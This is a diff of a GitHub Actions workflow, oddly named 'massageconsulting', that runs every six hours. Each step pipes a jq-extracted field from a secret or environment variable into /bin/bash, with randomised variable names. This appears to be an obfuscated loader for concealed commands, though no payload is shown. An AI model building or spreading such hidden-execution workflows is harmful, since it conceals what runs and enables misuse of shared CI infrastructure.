@@ -2,7 +2,7 @@ name: massageconsulting
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 3/6 * * *'
+    - cron: '3 3/6 * * *'
 
 jobs:
   build:
@@ -12,15 +12,11 @@ jobs:
       - uses: actions/checkout@v4
       - name: massageconsulting
         env:
-          ay70: ${{ secrets.ay70 }}
+          mhbvf86: ${{ secrets.mhbvf86 }}
         run: |
-          echo $ay70 | jq -r .l720 | /bin/bash
-          echo $ohdq787 | jq -r .kl32 | /bin/bash
-          echo $tjds6 | jq -r .ymxdt50391 | /bin/bash
-          echo $gcz4 | jq -r .juosr4963 | /bin/bash
-          echo $ljy0505 | jq -r .jwwh8622 | /bin/bash
-          echo $ih5056 | jq -r .slamj68 | /bin/bash
-          echo $npsih92826 | jq -r .nb35409 | /bin/bash
-          echo $jf2 | jq -r .rxtku1 | /bin/bash
-          echo $p5973 | jq -r .ils8 | /bin/bash
+          echo $mhbvf86 | jq -r .qazcw3571 | /bin/bash
+          echo $qreao4 | jq -r .pau54863 | /bin/bash
+          echo $iau401 | jq -r .wgh1 | /bin/bash
+          echo $zmkvj683 | jq -r .r39 | /bin/bash
+          echo $tmyw3 | jq -r .l19 | /bin/bash
 
